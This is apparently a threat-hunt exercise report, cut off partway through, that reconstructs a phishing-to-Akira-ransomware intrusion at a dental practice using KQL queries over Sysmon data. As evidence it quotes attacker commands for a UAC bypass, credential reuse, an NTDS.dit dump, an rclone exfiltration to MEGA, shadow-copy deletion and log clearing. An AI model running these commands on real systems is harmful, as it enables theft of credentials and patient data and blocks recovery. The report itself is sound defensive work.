# 🛡️ Threat Hunt Report – Harborlight (HL-INC-2026-0204)

---

## 📌 Executive Summary

On 4 February 2026, a front-office user at Harborlight Dental & Insurance opened a phishing archive that delivered a Cobalt Strike-style DLL implant. Over the next three and a half hours, the attacker escalated privileges, stole the user's domain password from LSASS, and moved from the workstation to the file server and then the domain controller. They dumped the entire Active Directory database, exfiltrated the practice's file shares (including patient data) to MEGA, destroyed recovery options, and deployed **Akira** ransomware on all three hosts. The ransom notes were not the end of the incident: the attacker created a Domain Admin backdoor account, and two implants on the domain controller were **still beaconing to C2 13 hours later**, when telemetry ended. The domain should be treated as fully compromised.

---

## 🎯 Hunt Objectives

- Identify malicious activity across endpoints and network telemetry  
- Correlate attacker behavior to MITRE ATT&CK techniques  
- Document evidence, detection gaps, and response opportunities  
- Separate attacker activity from background noise and Coastal MSP tooling  
- Determine whether the intrusion ended when the visible impact did

---

## 🧭 Scope & Environment

- **Environment:** Harborlight Dental & Insurance, a flat `172.16.0.0/24` LAN with no segmentation, managed by Coastal MSP (5-person contractor, no SOC). Hosts in scope: **BACKOFFICE-PC1** (172.16.0.109, user Emily Grant), **HL-FS01** (172.16.0.8, file server), **ADDC01** (172.16.0.7, domain controller)  
- **Data Sources:** `HarborlightDental_CL` in the `LAW-SilentCorridor` Log Analytics workspace: Sysmon (EID 1, 3, 7, 8, 10, 11, 13, 17, 22) and Windows Security events (4720, 4722, 4724, 4728, 4732, 4738, 5379). No packet capture, Zeek, or Suricata.  
- **Timeframe:** 2026-02-04 00:00 UTC → 2026-02-04 18:47 UTC (all times UTC, queried on `EventTime`)  

---

## 📚 Table of Contents

- [🧠 Hunt Overview](#-hunt-overview)
- [🧬 MITRE ATT&CK Summary](#-mitre-attck-summary)
- [🔍 Section Analysis](#-section-analysis)
  - [🚩 Section 1: Initial Access](#-section-1)
  - [🚩 Section 2: Execution](#-section-2)
  - [🚩 Section 3: Privilege Escalation](#-section-3)
  - [🚩 Section 4: Defence Evasion](#-section-4)
  - [🚩 Section 5: Credential Access](#-section-5)
  - [🚩 Section 6: Lateral Movement](#-section-6)
  - [🚩 Section 7: Credential Access (Again)](#-section-7)
  - [🚩 Section 8: Defence Evasion (Again)](#-section-8)
  - [🚩 Section 9: Exfiltration](#-section-9)
  - [🚩 Section 10: Impact (Anti-Recovery)](#-section-10)
  - [🚩 Section 11: Persistence](#-section-11)
  - [🚩 Section 12: Command and Control](#-section-12)
  - [🚩 Section 13: Persistence / Privilege Escalation (Again)](#-section-13)
  - [🚩 Section 14: Impact (Encryption)](#-section-14)
  - [🚩 Section 15: Judgement](#-section-15)
- [🚨 Detection Gaps & Recommendations](#-detection-gaps--recommendations)
- [🧾 Final Assessment](#-final-assessment)
- [📎 Analyst Notes](#-analyst-notes)

---

## 🧠 Hunt Overview

Nobody was watching this environment live. Staff reported ransom notes on the morning of 4 February, and the full chain had to be rebuilt from raw Sysmon and Security telemetry with no alert queue to start from.

The intrusion followed a standard double-extortion playbook: **initial access → execution → privilege escalation → credential access → lateral movement → exfiltration → impact**. Defence evasion and persistence recurred throughout. Three patterns defined it:

- **Living off the land.** rundll32, fodhelper, WMI, ntdsutil, vssadmin, bcdedit, and wevtutil carried most of the attack. The attacker's own tools were renamed to look like Windows components (`taskhostw.exe`, `MsMpEng.exe`, `OneDriveSync.exe`, `wsync.exe`, `updater.exe`).
- **Spoolsv as the workhorse.** On every host, the implant injected into the SYSTEM-level Print Spooler, and nearly every privileged action after that came from `spoolsv.exe`.
- **One stolen password, the whole domain.** `Emily.Grant / Dental2024!`, taken from LSASS, opened admin shares on both servers. That's an account the baseline said had no rights there.

### Attack Timeline (UTC)

| Time | Host | Event |
|---|---|---|
| 01:57:15 | PC1 | `Vendor_Invoice_Review.7z` downloaded by emily.grant |
| 01:59:15 | PC1 | `rundll32.exe D:\review.dll,StartW` (first execution, no callback) |
| 02:25:06 | PC1 | Second lure runs `rundll32 E:\review.dll,StartW` → C2 established 02:25:07 |
| 02:32:48 | PC1 | Injection into `notepad.exe` |
| 02:42:39 | PC1 | fodhelper UAC bypass → `C:\Users\Public\taskhostw.exe` at High integrity |
| 02:47:11 | PC1 | Injection into `spoolsv.exe` |
| 03:31:58 | PC1 | Spoolsv re-injected; LSASS opened with `0x1FFFFF` |
| 03:34:09 | PC1 → FS01 | `net use \\172.16.0.8\C$` with Emily.Grant / Dental2024! |
| 03:35:10 | FS01 | Implant runs via WMI (WmiPrvSE parent) |
| 03:41–03:42 | FS01 | Run key + scheduled task persistence; first log clear |
| 03:44–03:53 | FS01 | Tool staging from `sync.cloud-endpoint.net` |
| 03:58:33 | FS01 | rclone (as MsMpEng.exe) copies `C:\Shares` → `mega:HARBORLIGHT-exfil` |
| 04:03:50 | FS01 | `update.bat`: Defender, firewall, backups, shadow copies disabled (re-run 04:05:12) |
| 04:26:08 | FS01 | Injection into `spoolsv.exe` |
| 04:28:22 | FS01 → DC | `net use \\172.16.0.7\C$` with the same credential |
| 04:33:55 | DC | `ntdsutil` IFM dump of NTDS.dit |
| 04:42:28 | DC | WMI shadow copy deletion issued from the DC; WMI traffic back to FS01/PC1 at 04:44 |
| 04:44–04:54 | DC / FS01 | Backup implants `OneDriveSync.exe` and `wsync.exe` |
| 05:13–05:17 | All | Akira (`updater.exe`) encrypts FS01, DC, PC1 |
| 05:18–05:20 | All | Staggered 16-channel log wipe (`defender.bat`) |
| 05:21:56 | DC | `svc_sql / Summer2024!` created → Domain Admins (05:22:57) |
| 05:23:28 | DC | `akira_svc` queried (decoy, never created) |
| 09:23 | PC1 | Workstation beacons stop |
| **18:47:29** | **DC** | **Last C2 callback in the data: compromise ongoing** |

---

## 🧬 MITRE ATT&CK Summary

| Section | Technique Category | MITRE ID | Priority |
|-----:|-------------------|----------|----------|
| 1 | Phishing / Mark-of-the-Web Bypass | T1566.001, T1553.005 | High |
| 2 | Rundll32 Proxy Execution / Process Injection | T1218.011, T1055.002 | High |
| 3 | Bypass UAC / Masquerading | T1548.002, T1036.005 | High |
| 4 | Process Injection (spoolsv.exe) | T1055 | Critical |
| 5 | OS Credential Dumping: LSASS / Valid Accounts | T1003.001, T1078.002 | Critical |
| 6 | SMB Admin Shares / WMI | T1021.002, T1047 | Critical |
| 7 | OS Credential Dumping: NTDS | T1003.003 | Critical |
| 8 | Clear Windows Event Logs | T1070.001 | High |
| 9 | Ingress Tool Transfer / Exfiltration to Cloud Storage | T1105, T1567.002, T1036.005 | Critical |
| 10 | Impair Defenses / Inhibit System Recovery | T1562.001, T1562.004, T1490, T1489 | Critical |
| 11 | Run Key / Scheduled Task / Redundant Implants | T1547.001, T1053.005, T1036.005 | High |
| 12 | Web Protocol C2 behind CDN | T1071.001, T1090.004 | High |
| 13 | Create Domain Account / Account Manipulation | T1136.002, T1098 | Critical |
| 14 | Data Encrypted for Impact (Akira) | T1486 | Critical |
| 15 | Full Kill Chain | TA0001 → TA0040 | n/a |

---

## 🔍 Section Analysis

_The analysis follows the 15 sections the hunt was divided into. Each section lists the questions answered, then the supporting evidence. All sections are collapsible for readability._

---

<details>
<summary id="-section-1">🚩 <strong>Section 1: Initial Access</strong></summary>

### ❓ Questions Answered

| # | Question | Answer |
|---|----------|--------|
| Q1 | Execution Gate: what has to happen before a downloaded file becomes a compromise? | **A**, it has to run |
| Q2 | How did they get in? | `Vendor_Invoice_Review.7z, emily.grant` |

### 🎯 Objective
Land a payload on the workstation in a way that avoids Mark-of-the-Web checks.

### 📌 Finding
Emily Grant downloaded `Vendor_Invoice_Review.7z` through Edge. She installed 7-Zip to open it, which extracted `Vendor_Invoice_Review.iso`. Files inside a mounted ISO don't carry Mark-of-the-Web, so SmartScreen never checked the DLL inside. A second, company-branded lure (`Harborlight_Insurance_Claims.7z` → `.iso`) followed at 02:24. The archive name changed between lures, but the account (`emily.grant`) anchors the timeline.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | BACKOFFICE-PC1 |
| Timestamp | 01:57:15 (lure #1), 02:24:21 (lure #2) |
| Process | msedge.exe → 7zG.exe |
| Parent Process | explorer.exe |
| Artifacts | `C:\Users\emily.grant\Downloads\Vendor_Invoice_Review.7z` (+ `:Zone.Identifier`), `Vendor_Invoice_Review.iso` (01:59:02) |

### 💡 Why it matters
Delivery alone isn't a compromise. The file has to execute. The 7z → ISO wrapping is a deliberate Mark-of-the-Web bypass (T1553.005).

### 🔧 KQL Query Used
```kql
HarborlightDental_CL
| where host has "BACKOFFICE-PC1" and EventID == 11
| where EventTime between (datetime(2026-02-04 01:53) .. datetime(2026-02-04 02:30))
| where TargetFilename has "Downloads"
| project EventTime, Image, TargetFilename
| order by EventTime asc
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Alert on `.iso`, `.img`, or `.vhd` files created by an archiver (7zG.exe, 7z.exe, WinRAR) under a user's Downloads folder.

</details>

---

<details>
<summary id="-section-2">🚩 <strong>Section 2: Execution</strong></summary>

### ❓ Questions Answered

| # | Question | Answer |
|---|----------|--------|
| Q1 | What actually runs, once that file lands? | `rundll32.exe D:\review.dll,StartW` |
| Q2 | What does it hide inside, before anyone's even looking for it? | `notepad.exe`, hiding inside a trusted, benign process to evade detection |
| Q3 | Why does the second file matter if it's not new malware? | Same DLL and export, different launch chain. It's a resilient re-delivery that actually established C2 |

### 🎯 Objective
Run the payload through a signed Windows binary, then hide its activity.

### 📌 Finding
From the mounted ISO, explorer.exe launched `rundll32.exe D:\review.dll,StartW` three times (01:59–02:00), but none of these runs reached the C2. The second lure used a drive-letter loop, `for %d in (D E F G H I J) do if exist %d:\review.dll rundll32 %d:\review.dll,StartW`, which ran `E:\review.dll` at 02:25:06. The first C2 DNS lookup followed one second later. Seven minutes after that, rundll32 opened `notepad.exe` with full access and injected into it four times (02:32:48–02:35:45), at Medium integrity, purely for concealment.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | BACKOFFICE-PC1 |
| Timestamp | 01:59:15 (first execution), 02:25:06 (execution that reached C2), 02:32:48 (notepad injection) |
| Process | rundll32.exe |
| Parent Process | explorer.exe (lure #1), cmd.exe (lure #2) |
| Command Line | `rundll32.exe D:\review.dll,StartW` / `rundll32 E:\review.dll,StartW` |

### 💡 Why it matters
`StartW` is Cobalt Strike's default DLL export. The DLL name changes between campaigns, but rundll32 loading a DLL from a mounted drive is a lasting detection target.

### 🔧 KQL Query Used
```kql
HarborlightDental_CL
| where host has "BACKOFFICE-PC1" and EventID in (8, 10)
| extend x = tostring(EventData_Xml)
| extend SrcImg = extract(@"SourceImage['""]?\s*[>:=]\s*['""]?([^<'""]+)", 1, x),
         TgtImg = extract(@"TargetImage['""]?\s*[>:=]\s*['""]?([^<'""]+)", 1, x),
         Access = extract(@"GrantedAccess['""]?\s*[>:=]\s*['""]?(0x[0-9A-Fa-f]+)", 1, x)
| where SrcImg has_any ("rundll32", "taskhostw")
| project EventTime, EventID, SrcImg, TgtImg, Access
| order by EventTime asc
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Flag `rundll32.exe` loading DLLs from drive letters D–J or outside `C:\Windows`, and any Sysmon EID 8 with rundll32 as source.

</details>

---

<details>
<summary id="-section-3">🚩 <strong>Section 3: Privilege Escalation</strong></summary>

### ❓ Questions Answered

| # | Question | Answer |
|---|----------|--------|
| Q1 | How do they get elevated without a UAC prompt? | `HKCU\Software\Classes\ms-settings\shell\open\command`, `C:\Users\Public\taskhostw.exe` |
| Q2 | Real or Noise: taskhostw.exe | The file path. The real binary runs from `C:\Windows\System32\`, the attacker's from world-writable `C:\Users\Public\` |
| Q3 | Of the two attempts, which one actually elevated? | Second, 2026-02-04T02:42:39Z |

### 🎯 Objective
Get High integrity without a UAC prompt.

### 📌 Finding
The beacon pointed the `ms-settings` handler under HKCU at its payload and set an empty `DelegateExecute`, then launched the auto-elevating `fodhelper.exe`. The first attempt (02:42:11) stayed at Medium. The second, through `cmd /c fodhelper.exe` at 02:42:39, elevated and started the payload at High integrity at 02:42:40. The payload uses the name of a real Windows binary, so only the full Image path separates it from the legitimate process.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | BACKOFFICE-PC1 |
| Timestamp | 02:40:41 (registry), 02:42:39 (elevation) |
| Process | fodhelper.exe → `C:\Users\Public\taskhostw.exe` (High) |
| Parent Process | rundll32.exe → reg.exe / cmd.exe |
| Command Line | `reg add HKCU\Software\Classes\ms-settings\shell\open\command /ve /d C:\Users\Public\taskhostw.exe /f` |

### 💡 Why it matters
The successful elevation at 02:42:39 marks where all later privileged activity begins.

### 🔧 KQL Query Used
```kql
HarborlightDental_CL
| where host has "BACKOFFICE-PC1" and EventID == 1
| where CommandLine has "ms-settings" or Image has "fodhelper" or ParentImage has "fodhelper"
| project EventTime, Image, ParentImage, CommandLine, IntegrityLevel
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Alert on registry writes to `ms-settings\shell\open\command` and on any child of `fodhelper.exe`. For masquerading, use `Image endswith "\\taskhostw.exe" and Image !~ @"C:\Windows\System32\taskhostw.exe"`.

</details>

---

<details>
<summary id="-section-4">🚩 <strong>Section 4: Defence Evasion</strong></summary>

### ❓ Questions Answered

| # | Question | Answer |
|---|----------|--------|
| Q1 | How does spoolsv.exe end up doing everything from here on? | `C:\Users\Public\taskhostw.exe` → `C:\Windows\System32\spoolsv.exe`, CreateRemoteThread injection (Sysmon EID 8), on BACKOFFICE-PC1 and HL-FS01 |

### 🎯 Objective
Run attacker code as SYSTEM inside a trusted, always-on service.

### 📌 Finding
The elevated implant swept the process list (paired `0x1410` / `0x1FFFFF` opens), then created a remote thread in the Print Spooler. After that, spoolsv.exe issued the `net use`, file copies, WMI, account creation, and log wipes. The pattern repeated on HL-FS01, and spoolsv-driven commands also appear on ADDC01.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | BACKOFFICE-PC1, HL-FS01 |
| Timestamp | PC1 02:47:11 and 03:31:58; FS01 04:26:08 |
| Process | `C:\Users\Public\taskhostw.exe` (source) |
| Target | `C:\Windows\System32\spoolsv.exe` |
| Event | Sysmon EID 8 CreateRemoteThread |

### 💡 Why it matters
Print Spooler should never start `cmd.exe`, run `net use`, or query external domains. This injection is the link between "elevated implant" and "a Windows service acting maliciously."

### 🔧 KQL Query Used
```kql
HarborlightDental_CL
| where EventID == 8
| extend x = tostring(EventData_Xml)
| extend SrcImg = extract(@"SourceImage['""]?\s*[>:=]\s*['""]?([^<'""]+)", 1, x),
         TgtImg = extract(@"TargetImage['""]?\s*[>:=]\s*['""]?([^<'""]+)", 1, x)
| where TgtImg has "spoolsv"
| summarize First=min(EventTime), Last=max(EventTime), Count=count() by host, SrcImg
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Alert on `spoolsv.exe` as parent of cmd.exe, powershell.exe, net.exe, or WMIC.exe, and on spoolsv DNS to non-Microsoft domains. Disable the Print Spooler on DCs and non-print servers.

</details>

---

<details>
<summary id="-section-5">🚩 <strong>Section 5: Credential Access</strong></summary>

### ❓ Questions Answered

| # | Question | Answer |
|---|----------|--------|
| Q1 | Local to Domain Escalation | **B**, local credential material |
| Q2 | Real or Noise: Credential Manager reads | Noise |
| Q3 | Which process actually touches credential memory? | `spoolsv.exe`, `lsass.exe` |
| Q4 | What does that access level actually mean? | `0x1FFFFF`, PROCESS_ALL_ACCESS |
| Q5 | Which account, and what's the password? | `Emily.Grant`, `Dental2024!` |

### 🎯 Objective
Turn local SYSTEM into usable domain credentials.

### 📌 Finding
With SYSTEM rights but no domain credentials, the attacker went after local credential material. The injected spoolsv.exe opened `lsass.exe` with `0x1FFFFF`, full read/write access to LSASS memory. Two minutes later, Emily's password appeared in plaintext on a command line. Credential Manager reads (EventCode 5379) occur steadily before, during, and after the attack, so they're background noise.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | BACKOFFICE-PC1 |
| Timestamp | 03:31:58 (LSASS access), 03:34:09 (first credential use) |
| Process | spoolsv.exe → lsass.exe |
| Access | `0x1FFFFF` |
| Command Line | `net use Z: \\172.16.0.8\C$ /user:HARBORLIGHT\Emily.Grant Dental2024!` |

### 💡 Why it matters
The stolen credential is the pivot point for all later lateral movement. The accessing process is the injected spoolsv, not the attacker's original binary.

### 🔧 KQL Query Used
```kql
HarborlightDental_CL
| where host has "BACKOFFICE-PC1" and EventID == 10
| where EventTime between (datetime(2026-02-04 02:42) .. datetime(2026-02-04 03:35))
| extend x = tostring(EventData_Xml)
| extend SrcImg = extract(@"SourceImage['""]?\s*[>:=]\s*['""]?([^<'""]+)", 1, x),
         TgtImg = extract(@"TargetImage['""]?\s*[>:=]\s*['""]?([^<'""]+)", 1, x),
         Access = extract(@"GrantedAccess['""]?\s*[>:=]\s*['""]?(0x[0-9A-Fa-f]+)", 1, x)
| where TgtImg has "lsass"
| project EventTime, SrcImg, TgtImg, Access
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Alert on non-security processes opening lsass.exe with `0x1010`, `0x1410`, or `0x1FFFFF`. Enable LSA Protection (RunAsPPL) and Credential Guard, and alert on plaintext passwords in command lines.

</details>

---

<details>
<summary id="-section-6">🚩 <strong>Section 6: Lateral Movement</strong></summary>

### ❓ Questions Answered

| # | Question | Answer |
|---|----------|--------|
| Q1 | Credential Reach Test | **B**, try it against one adjacent host first |
| Q2 | Where does the credential go first? | BACKOFFICE-PC1 → HL-FS01, 172.16.0.8, 2026-02-04T03:34:09Z |
| Q3 | Where does it go from there? | HL-FS01 → ADDC01, 172.16.0.7, 2026-02-04T04:28:22Z |
| Q4 | Does the traffic only flow one way? | `wmic process call create "cmd /c vssadmin delete shadows /all /quiet"`. The DC issues commands back to hosts it already compromised, so the compromise is bidirectional |
| Q5 | Lateral Movement Prevention | Network Segmentation |

### 🎯 Objective
Test how far the credential reaches, then move toward the domain controller.

### 📌 Finding
The hijacked spoolsv mounted HL-FS01's `C$` with Emily's credential, copied the implant, and ran it through WMI 56 seconds later (03:35:10, WmiPrvSE parent). From HL-FS01's injected spoolsv, the same pattern reached ADDC01 at 04:28:22. From the DC, spoolsv issued WMI with the same credential, and the DC's WMIC connected back to HL-FS01 (04:44:33) and PC1 (04:44:44), with an inbound WmiPrvSE session on FS01 at 04:44:32.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Hop 1 | PC1 → HL-FS01 (172.16.0.8), 03:34:09 |
| Hop 2 | HL-FS01 → ADDC01 (172.16.0.7), 04:28:22 |
| Reverse | ADDC01 → HL-FS01 / PC1 via WMIC, 04:42:28–04:44:44 |
| Parent Process | spoolsv.exe (System) |
| Command Line | `net use Y: \\172.16.0.7\C$ /user:HARBORLIGHT\Emily.Grant Dental2024!` |

### 💡 Why it matters
A front-office account had admin rights on both servers. The compromise was a hub-and-spoke network, not a straight line, so isolating any one host wouldn't have removed the attacker. On a flat `/24`, nothing stopped the movement. Segmentation would have.

### 🔧 KQL Query Used
```kql
HarborlightDental_CL
| where host has "ADDC01" and EventID == 3
| where EventTime >= datetime(2026-02-04 04:29)
| where DestinationIp startswith "172.16.0." and DestinationIp != "172.16.0.7"
| summarize First=min(EventTime), Count=count() by Image, DestinationIp, DestinationPort
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Alert on workstation-to-server admin-share access followed by a WmiPrvSE.exe child on the target, and on any DC running WMIC against other hosts.

</details>

---

<details>
<summary id="-section-7">🚩 <strong>Section 7: Credential Access (Again)</strong></summary>

### ❓ Questions Answered

| # | Question | Answer |
|---|----------|--------|
| Q1 | What does the attacker take from the DC itself? | `ntdsutil IFM (Install From Media)` |

### 🎯 Objective
Take every credential in the domain.

### 📌 Finding
On the DC, the attacker used ntdsutil's Install From Media feature to create a consistent copy of NTDS.dit plus the SYSTEM and SECURITY hives. It was re-run through spoolsv two minutes later.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | ADDC01 |
| Timestamp | 04:33:55, 04:35:35 |
| Process | ntdsutil.exe |
| Parent Process | cmd.exe ← `C:\Users\Public\taskhostw.exe` (then spoolsv.exe) |
| Command Line | `ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\ntds" quit quit` |

### 💡 Why it matters
This is a domain-wide credential dump, including krbtgt, done with a signed Microsoft tool. Every domain password, plus krbtgt (reset twice), has to be considered compromised.

### 🔧 KQL Query Used
```kql
HarborlightDental_CL
| where host has "ADDC01" and EventID == 1
| where CommandLine has_any ("ntdsutil", "ifm", "ntds")
| project EventTime, Image, ParentImage, CommandLine
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Alert on `ntdsutil` with `ifm`, on `vssadmin create shadow` on DCs, and on `ntds.dit` created outside `C:\Windows\NTDS`.

</details>

---

<details>
<summary id="-section-8">🚩 <strong>Section 8: Defence Evasion (Again)</strong></summary>

### ❓ Questions Answered

| # | Question | Answer |
|---|----------|--------|
| Q1 | Post-Extraction Pivot | **B**, clear logs |
| Q2 | Which hosts get their logs cleared? | BACKOFFICE-PC1, HL-FS01, ADDC01 |
| Q3 | Is there one channel cleared everywhere, without exception? | Security |
| Q4 | Which wipe is the most thorough? | BACKOFFICE-PC1, HL-FS01, ADDC01, staggered |

### 🎯 Objective
Destroy evidence after the loudest actions.

### 📌 Finding
Logs were cleared on all three hosts. The most thorough wipe (`defender.bat`, 16 channels including Sysmon/Operational, Security, WMI-Activity, TaskScheduler, and RDP) ran one host per minute: PC1 05:18:21 → FS01 05:19:09 → DC 05:20:00, the same direction the intrusion took. Security was cleared in every burst on every host.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | BACKOFFICE-PC1, HL-FS01, ADDC01 |
| Timestamp | FS01 03:42:36; Akira built-in clears 05:13–05:17; defender.bat 05:18–05:20 |
| Process | wevtutil.exe |
| Parent Process | cmd.exe ← defender.bat / updater.exe / taskhostw.exe |
| Command Line | `wevtutil cl Security` (+ System, Windows PowerShell, Sysmon/Operational, …) |

### 💡 Why it matters
The local logs were wiped, but every event had already been forwarded to Log Analytics, which is why this reconstruction was possible.

### 🔧 KQL Query Used
```kql
HarborlightDental_CL
| where EventID == 1 and Image has "wevtutil" and CommandLine has " cl "
| summarize Channels=dcount(CommandLine), First=min(EventTime) by host, ParentImage
| order by First asc
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Alert on `wevtutil cl` and on Security 1102 / System 104. Forward logs off-host in near real time.

</details>

---

<details>
<summary id="-section-9">🚩 <strong>Section 9: Exfiltration</strong></summary>

### ❓ Questions Answered

| # | Question | Answer |
|---|----------|--------|
| Q1 | Exfil Timing | **C**, during, overlapping |
| Q2 | What's leaving the network, disguised as what? | rclone, `C:\ProgramData\Microsoft\MsMpEng.exe` |
| Q3 | What moves, and where to? | `C:\Shares`, `mega:HARBORLIGHT-exfil` |
| Q4 | Whose account receives it? | `jwilson.vhr@proton.me` |

### 🎯 Objective
Steal the practice's data before encrypting it (double extortion).

### 📌 Finding
The implant staged tools from `sync.cloud-endpoint.net` using encoded PowerShell (`RuntimeBroker.exe`, `MsMpEng.exe`, `config.dat`, `update.bat`, `rclone.conf`). rclone, renamed `MsMpEng.exe`, then copied the full share root, including `C:\Shares\PatientData`, to a MEGA remote tied to a Proton account. The operator rebuilt `rclone.conf` by hand after a failed first attempt, ran the copy twice, and checked it with `tasklist`. On HL-FS01 the exfiltration sits between log wipes (03:42 and 05:13), so it overlaps the anti-forensics work.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | HL-FS01 |
| Timestamp | 03:44:56 – 03:53:43 (staging), 03:58:33 → 04:03:39 (exfiltration) |
| Process | `C:\ProgramData\Microsoft\MsMpEng.exe` (rclone) |
| Parent Process | cmd.exe ← `C:\Users\Public\taskhostw.exe` |
| Command Line | `MsMpEng.exe --config C:\ProgramData\Microsoft\rclone.conf copy C:\Shares mega:HARBORLIGHT-exfil -q` |

### 💡 Why it matters
Patient data (PHI) left the network, which brings breach-notification obligations. The real MsMpEng.exe never runs from `C:\ProgramData\Microsoft\` or accepts `--config` / `copy`.

### 🔧 KQL Query Used
```kql
HarborlightDental_CL
| where host has "HL-FS01"
| where CommandLine has_any ("rclone", "mega:", "--config", "-enc") or QueryName has "mega"
| project EventTime, EventID, Image, CommandLine, QueryName
| order by EventTime asc
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Hunt for rclone syntax regardless of binary name, decode every `-enc` argument, and alert on server DNS to `*.mega.co.nz` / `*.mega.nz`.

</details>

---

<details>
<summary id="-section-10">🚩 <strong>Section 10: Impact (Anti-Recovery)</strong></summary>

### ❓ Questions Answered

| # | Question | Answer |
|---|----------|--------|
| Q1 | Double-Extortion Next Move | **B**, destroy recovery options, then encrypt |
| Q2 | Which host loses its recovery options, and which doesn't? | HL-FS01 gets the full treatment. ADDC01 gets partial: VSS shadow deletion only |
| Q3 | What techniques get used together? | Shadow copy deletion (vssadmin / wmic), boot recovery disabled (bcdedit), backup catalog deletion (wbadmin) |
| Q4 | Does it only happen once? | Twice, at 04:04:05 and 04:05:26 |

### 🎯 Objective
Remove security tools and recovery options before encryption.

### 📌 Finding
Eleven seconds after exfiltration ended, `update.bat` disabled Defender and MDE (Set-MpPreference ×5, policy keys, 51 `net stop` and 44 `taskkill` commands), turned off the firewall, and ran three anti-recovery techniques. The operator ran it, read it with `type`, ran it again, and checked the result with `vssadmin list shadows`. That's deliberate verification. ADDC01 only had its shadow copies deleted (04:43:35).

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | HL-FS01 (full), ADDC01 (VSS only) |
| Timestamp | 04:04:05 (run 1), 04:05:26 (run 2), 04:05:49 (check) |
| Process | cmd.exe → vssadmin.exe, WMIC.exe, bcdedit.exe, mmc.exe |
| Parent Process | `C:\Users\Public\taskhostw.exe` |
| Command Line | `vssadmin delete shadows /all /quiet`; `wmic shadowcopy delete`; `bcdedit /set {default} recoveryenabled no` + `bootstatuspolicy ignoreallfailures`; `wbadmin delete catalog -quiet` |

### 💡 Why it matters
`wbadmin` resolved to `mmc.exe wbadmin.msc` on both runs, so the backup catalog deletion most likely failed. The Windows Server Backup catalog on HL-FS01 is a recovery lead.

### 🔧 KQL Query Used
```kql
HarborlightDental_CL
| where EventID == 1
| where CommandLine has_any ("vssadmin", "shadowcopy", "bcdedit", "wbadmin", "update.bat")
| project EventTime, host, Image, ParentImage, CommandLine
| order by EventTime asc
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Page immediately on `vssadmin delete shadows`, `wmic shadowcopy delete`, or `bcdedit … recoveryenabled no`. These almost always come minutes before encryption.

</details>

---

<details>
<summary id="-section-11">🚩 <strong>Section 11: Persistence</strong></summary>

### ❓ Questions Answered

| # | Question | Answer |
|---|----------|--------|
| Q1 | Persistence Hunt | **B**, additional backdoors / persistence |
| Q2 | Is there a second way back in? | `OneDriveSync.exe`, `C:\Users\Public\OneDriveSync.exe` |
| Q3 | Is there a third? | `wsync.exe`, dropped by `C:\Users\Public\taskhostw.exe`, on HL-FS01 |

### 🎯 Objective
Keep more than one way back in.

### 📌 Finding
On HL-FS01, the implant registered itself through a Run key named `SecurityHealth` (03:41:54) and an onstart SYSTEM scheduled task named `WindowsUpdate` (03:42:07). After the security tools were killed, the attacker added two more independent implants, each with its own C2 beacon: `OneDriveSync.exe` on ADDC01 (04:44:48) and HL-FS01 (04:47:28), and `wsync.exe` on HL-FS01 (04:54:52).

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | HL-FS01, ADDC01 |
| Run key / task | `HKLM\…\Run\SecurityHealth` and task `WindowsUpdate` → `C:\Users\Public\taskhostw.exe` |
| Backdoor #2 | `C:\Users\Public\OneDriveSync.exe` (DC), `C:\ProgramData\Microsoft\OneDriveSync.exe` (FS01) |
| Backdoor #3 | `C:\ProgramData\Microsoft\wsync.exe` (FS01) |
| Parent Process | spoolsv.exe (DC); `C:\Users\Public\taskhostw.exe` (FS01) |

### 💡 Why it matters
The real OneDrive is `OneDrive.exe` under `%LocalAppData%`, and doesn't belong on a DC. Removing taskhostw.exe alone would have left the other implants running.

### 🔧 KQL Query Used
```kql
HarborlightDental_CL
| where EventID in (1, 11)
| where Image has_any ("OneDriveSync", "wsync") or TargetFilename has_any ("OneDriveSync", "wsync")
     or CommandLine has_any ("CurrentVersion\\Run", "schtasks")
| project EventTime, host, EventID, Image, ParentImage, CommandLine, TargetFilename
| order by EventTime asc
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Hunt for Microsoft-sounding executables outside their standard paths, and Run keys or tasks pointing into `C:\Users\Public` or `C:\ProgramData`.

</details>

---

<details>
<summary id="-section-12">🚩 <strong>Section 12: Command and Control</strong></summary>

### ❓ Questions Answered

| # | Question | Answer |
|---|----------|--------|
| Q1 | Where do these backdoors actually phone home to? | `cdn.cloud-endpoint.net`, which resolves to Cloudflare CDN IPs (104.21.30.237, 172.67.174.46), so blocking the IPs won't stop it |
| Q2 | Is this a one-off connection or something more sustained? | Persistent: ~7 hours on PC1, 915 connections on 443 and 579 on 80 (~61% / 39%) |
| Q3 | Is it really over? | Not over. ADDC01 still beaconing at 18:47:29 UTC, 13+ hours after the ransom notes |

### 🎯 Objective
Keep a C2 channel that survives IP blocking and blends with web traffic.

### 📌 Finding
